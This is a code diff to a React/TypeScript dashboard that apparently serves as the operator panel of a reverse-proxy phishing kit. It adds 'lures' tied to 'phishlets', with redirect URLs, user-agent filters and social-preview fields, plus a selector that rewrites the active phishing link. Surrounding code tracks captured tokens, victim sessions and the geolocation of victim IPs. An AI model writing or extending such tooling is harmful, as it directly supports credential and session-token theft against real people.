@@ -15,6 +15,22 @@ interface TokenData {
   };
 }
 
+interface Lure {
+  hostname: string;
+  id: string;
+  info: string;
+  og_desc: string;
+  og_image: string;
+  og_title: string;
+  og_url: string;
+  path: string;
+  paused: number;
+  phishlet: string;
+  redirect_url: string;
+  redirector: string;
+  ua_filter: string;
+}
+
 type CellValue = string | number | TokenData | null;
 
 interface TableColumn {
@@ -38,6 +54,8 @@ export default function Dashboard() {
   const [geoCache, setGeoCache] = useState<Record<string, GeoData>>({});
   const [operationInProgress, setOperationInProgress] = useState(false);
   const [isServiceRunning, setIsServiceRunning] = useState(true);
+  const [lures, setLures] = useState<Lure[]>([]);
+  const [selectedLure, setSelectedLure] = useState<Lure | null>(null);
 
   // Pagination state
   const [currentPage, setCurrentPage] = useState(1);
@@ -182,17 +200,33 @@ export default function Dashboard() {
   const fetchFullLink = useCallback(async () => {
     return withLoading(async () => {
       try {
-        const response = await fetch("/api/full-link");
-        if (!response.ok) {
+        // Also fetch all available lures
+        const [linkResponse, luresResponse] = await Promise.all([
+          fetch("/api/full-link"),
+          fetch("/api/lures"),
+        ]);
+
+        if (!linkResponse.ok) {
           throw new Error("Failed to fetch link");
         }
-        const data = await response.json();
+
+        const data = await linkResponse.json();
         setFullLink(data.fullUrl);
+
+        if (luresResponse.ok) {
+          const luresData = await luresResponse.json();
+          setLures(luresData.lures || []);
+
+          // Select the first lure by default if none is selected
+          if (luresData.lures && luresData.lures.length > 0 && !selectedLure) {
+            setSelectedLure(luresData.lures[0]);
+          }
+        }
       } catch (error) {
         console.error("Error fetching link:", error);
       }
     });
-  }, []);
+  }, [selectedLure]);
 
   const fetchGeoData = async (ip: string): Promise<GeoData | null> => {
     if (!ip || ip.trim() === "") {
@@ -279,6 +313,39 @@ export default function Dashboard() {
       // Return the latest complete session, or the latest session if no complete ones exist
       return latestComplete || sorted[0];
     });
+  };
+
+  const handleLureChange = async (lureId: string) => {
+    const selected = lures.find((lure) => lure.id === lureId);
+    if (selected) {
+      setSelectedLure(selected);
+
+      // Update link settings with the selected lure path
+      try {
+        const response = await fetch("/api/link-settings", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            afterLoginRedirect: selected.redirect_url || "",
+            useCaptcha: selected.redirector === "main",
+            linkPath: selected.path.startsWith("/")
+              ? selected.path.substring(1)
+              : selected.path,
+          }),
+        });
+
+        if (response.ok) {
+          // Refresh the full link after updating settings
+          fetchFullLink();
+          setError("Link updated successfully");
+          setTimeout(() => setError(null), 3000);
+        }
+      } catch (error) {
+        console.error("Error updating link settings:", error);
+      }
+    }
   };
 
   useEffect(() => {
@@ -591,6 +658,21 @@ export default function Dashboard() {
             </div>
             <div className="flex-grow">
               <div className="text-sm text-gray-400">Your Link:</div>
+              <div className="flex items-center space-x-2 mb-2">
+                {lures.length > 0 && (
+                  <select
+                    className="text-gray-200 bg-[#1B2028] border border-gray-700 rounded px-2 py-1 text-sm"
+                    value={selectedLure?.id || ""}
+                    onChange={(e) => handleLureChange(e.target.value)}
+                  >
+                    {lures.map((lure) => (
+                      <option key={lure.id} value={lure.id}>
+                        {lure.phishlet} - {lure.path}
+                      </option>
+                    ))}
+                  </select>
+                )}
+              </div>
               <div className="text-gray-300 font-medium flex items-center space-x-2">
                 <span data-allow-select="true">
                   {fullLink || "No active link generated"}
